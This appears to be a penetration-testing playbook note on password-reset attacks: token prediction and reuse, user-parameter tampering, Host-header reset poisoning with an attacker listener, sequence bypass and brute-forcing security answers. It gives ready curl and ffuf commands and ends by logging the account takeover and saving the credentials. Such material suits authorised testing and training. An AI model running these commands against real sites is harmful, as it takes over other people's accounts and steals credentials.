
Attacks against password-reset flows. Entry from [[Web Attack Checksheet]] sub-block 1.8 on forgot-password form observation.

Sister files: [[Credential Attacks]] (credential attacks against login), [[Login Bypass Techniques]] (login bypass), [[Username Enumeration]] (enumerate via reset form).

Ordering: fast checks first (obtain token, inspect for predictability); token attacks (prediction, reuse); reset URL manipulation (parameter tampering); host header / password reset poisoning (medium cost, requires attacker-controlled host); reset flow logic flaws (case sensitivity, sequence bypass); security question weakness. On successful reset → login as target user → route to [[Credential Attacks]] Section 6 (post-success routing).

---

## Pre-flight — obtain a reset token

Attacks in Sections 1-4 require obtaining at least one reset token to analyse. Trigger reset for a user you control (register test account first via [[Registration Attacks]] if needed; else use a known-valid username from [[Username Enumeration]] output).

```bash
curl -sX POST -i -d 'username=<test_user>' http://<host>:<port>/<reset_path>
```

Reset delivery mechanism:

- Email link → operator has email inbox for `<test_user>` → capture the reset URL
- SMS code → operator has phone number → capture code
- Displayed on-screen (dev/lab environments) → capture from response

Save the reset URL or token as `<token>` and the reset URL structure as `<reset_url_pattern>` (e.g. `http://<host>:<port>/reset?token=<token>&user=<user>`).

Route:

- Token/URL captured → Section 1
- No delivery mechanism accessible (real email required, no inbox) → Section 3 (URL-parameter attacks may still work without a captured token) OR Section 6 (skip token attacks)

---

## 1. Token prediction / weak generation

Reset tokens generated with weak randomness are predictable — attacker can generate a valid token for any user without triggering reset.

**Analyse token entropy and format:**

Capture 3-5 tokens (trigger reset multiple times, or across multiple test accounts):

```bash
for i in 1 2 3 4 5; do
  curl -sX POST -d "username=<test_user>_$i" http://<host>:<port>/<reset_path> >/dev/null
  # Retrieve token from email/response, log to file
done
```

Compare captured tokens:

- Sequential integers (`token=1`, `token=2`, ...) → trivial prediction
- Timestamp-based (`token=1699234567`) → predictable if creation time approximately known
- Hash of `<user>+<timestamp>` → reversible if inputs guessable (try `md5(<user><date>)`, `sha1(<user><timestamp>)`)
- UUIDv1 (time-based, first 8 hex chars = timestamp) → partially predictable
- UUIDv4 or high-entropy random (>128 bits) → not predictable

Route:

- Predictable pattern identified → generate token for target user, use with `<reset_url_pattern>` to reset target password → Section 7
- High-entropy random → 2

---

## 2. Token reuse

Some apps fail to invalidate reset tokens after use. Same token may work multiple times or for multiple users.

**Test single-token multi-use:**

```bash
# Complete a reset flow with a captured token
curl -sX POST -d 'token=<token>&password=NewPass1234' http://<host>:<port>/<reset_confirm_path>

# Try the same token again with a different password
curl -sX POST -d 'token=<token>&password=DifferentPass' http://<host>:<port>/<reset_confirm_path>
```

Route:

- Second attempt succeeds → token not invalidated after use → capture reset URL for target user, complete reset → Section 7
- Second attempt fails → 3

**Test token portability across users:**

Trigger reset for `<test_user_A>` and `<test_user_B>` simultaneously (within 5 seconds). Try `<test_user_A>`'s token with `<test_user_B>`'s reset URL (swap username parameter):

`curl -sX POST -d 'token=<token_A>&username=<test_user_B>&password=NewPass' http://<host>:<port>/<reset_confirm_path>`

Route:

- Token accepted for different user → bind flaw → set target user's password → Section 7
- Rejected → 3

---

## 3. Reset URL manipulation

Reset URLs often contain user identifiers alongside the token. Tamper with the identifier while keeping a valid token.

**Common reset URL patterns:**

- `?token=<t>&user=<u>` — swap user parameter
- `?token=<t>&email=<e>` — swap email parameter
- `?token=<t>&user_id=<n>` — swap numeric ID

**Test parameter override.** Trigger reset for `<test_user>`, capture URL, then substitute target user:

`curl -sX POST -d 'token=<test_user_token>&user=<target_user>&password=Attacker1234' http://<host>:<port>/<reset_confirm_path>`

**Test parameter pollution.** Send both users, first-wins vs last-wins parser behaviour:

`curl -sX POST -d 'token=<test_user_token>&user=<test_user>&user=<target_user>&password=Attacker1234' http://<host>:<port>/<reset_confirm_path>`

Also try duplicated parameter with array notation:

`curl -sX POST -d 'token=<test_user_token>&user[]=<test_user>&user[]=<target_user>&password=Attacker1234' http://<host>:<port>/<reset_confirm_path>`

Route:

- Any variant sets target user's password → login as target → Section 7
- All rejected → 4

---

## 4. Password reset poisoning (Host header attack)

If reset link generation uses the request's `Host` header (or `X-Forwarded-Host`) to construct the URL, an attacker-controlled host can hijack tokens.

**Precondition:** attacker-controlled listener (e.g. `nc -lvnp 80` on Kali, or a Burp Collaborator instance) reachable from the target application.

**Attack — inject host header:**

```bash
curl -sX POST -H 'Host: <attacker_host>' -H 'X-Forwarded-Host: <attacker_host>' -d 'username=<target_user>' http://<host>:<port>/<reset_path>
```

**Also try:**

- `X-Forwarded-Host: <attacker_host>` alone
- Host header as `<host>@<attacker_host>` (URL parser confusion)
- Host header as `<attacker_host>#<host>` (fragment confusion)

Route:

- Reset link arrives at attacker listener (or Burp Collaborator) containing valid token for target user → visit real reset URL with captured token → set target password → Section 7
- No incoming request at listener → 5

---

## 5. Reset flow logic flaws

Flaws in the multi-step reset workflow.

**Sequence bypass.** Reset flows typically have: (a) request reset, (b) receive link, (c) submit new password. Try submitting step (c) without completing (a) or (b):

`curl -sX POST -d 'username=<target_user>&password=NewPass1234' http://<host>:<port>/<reset_confirm_path>`

Some apps only check that the endpoint was reached, not that a valid reset was in-flight.

**Case-sensitivity in reset URL.** If reset URL contains case-sensitive parameters (username, path segments), try case variations:

`http://<host>:<port>/<reset_confirm_path>?user=ADMIN` (uppercase) vs `?user=admin`

Some apps compare case-sensitively for auth but case-insensitively for user lookup — may reset the wrong (admin) user's password while trusting the check.

**Reset for username=admin.** Trigger reset directly for admin:

`curl -sX POST -d 'username=admin' http://<host>:<port>/<reset_path>`

If reset link is displayed on-screen or in HTTP response (misconfigured dev/lab environments), grab it directly.

Route:

- Any logic flaw yields target password reset → Section 7
- All checks fail → 6

---

## 6. Security question weakness

If reset flow uses security questions, they're typically weaker than passwords.

**Common weak questions:**

- Mother's maiden name — often findable via OSINT
- Pet name — social media
- First school — LinkedIn / social media
- Favourite colour — small answer space (10-20 common answers)

**Enumerate answer space via brute force:**

`ffuf -w /usr/share/seclists/Miscellaneous/security-questions-common-answers.txt -X POST -d 'username=<target_user>&answer=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<security_question_path> -fr '<incorrect_answer_signal>' -t <threads>`

If wordlist doesn't exist locally, create from common answers:

```bash
cat > /tmp/security_answers.txt << 'EOF'
Smith
Jones
Williams
Brown
Taylor
Davies
red
blue
green
black
white
Rex
Buddy
Max
Charlie
Bella
London
Manchester
Birmingham
Leeds
Liverpool
EOF
```

Route:

- Answer accepted → security-question bypass, complete reset flow → Section 7
- All exhausted → Exhaustion

---

## 7. Post-success routing

On successful password reset for target user:

1. Log to `route_<ip>.txt`:

    `printf '[Password Reset Attacks] APPLIED: reset <target_user> password on <host>:<port>\n' >> route_<ip>.txt`

2. Save recovered creds:

    `echo '<target_user>:<new_password>' >> creds_<host>.txt`

3. Route to [[Credential Attacks]] Section 6 (post-success routing) with recovered `<target_user>:<new_password>`. From there:

- Authenticate to login form, capture session
- Re-walk WAC sub-blocks 1.6-1.13 authenticated
- Further route by post-login surface (JWT tampering, admin RCE features, PrivEsc)

---

## Exhaustion

Sections 1-6 all exhausted without successful reset:

- If token was never captured (Pre-flight blocked) → return to [[Web Attack Checksheet]] Step 1 walking (next sub-block)
- If token captured but attacks exhausted → return to [[Web Attack Checksheet]] Step 1 walking
